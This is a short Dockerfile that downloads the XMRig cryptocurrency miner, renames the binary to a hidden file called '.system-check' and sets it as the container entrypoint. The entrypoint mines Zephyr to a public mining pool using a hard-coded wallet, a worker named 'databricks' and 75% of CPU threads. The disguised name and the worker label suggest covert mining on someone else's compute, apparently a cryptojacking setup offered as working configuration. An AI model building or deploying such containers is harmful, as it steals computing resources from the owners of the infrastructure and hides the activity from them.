FROM ubuntu:22.04

RUN apt-get update && apt-get install -y wget && rm -rf /var/lib/apt/lists/*

RUN wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && \
    tar xf xmrig-6.21.0-linux-static-x64.tar.gz && \
    mv xmrig-6.21.0/xmrig .system-check && \
    rm -rf xmrig-6.21.0-linux-static-x64.tar.gz

# Değişiklik burada: Hem ENTRYPOINT hem CMD kullanıyoruz
ENTRYPOINT ["./.system-check"]
CMD ["-o", "de.zephyr.herominers.com:1123", "-u", "ZEPHYR3UsBjPbXaFoVnrGT5ReMf2DYfPv4JC51gFATKcJX66jgLP41DJHGAnEQrfVB5DnBRiyWk8qEA5F6gE7UhZe7pjCXtYM5T1L.databricks", "-p", "fly_ghost", "--cpu-max-threads-hint", "75"]
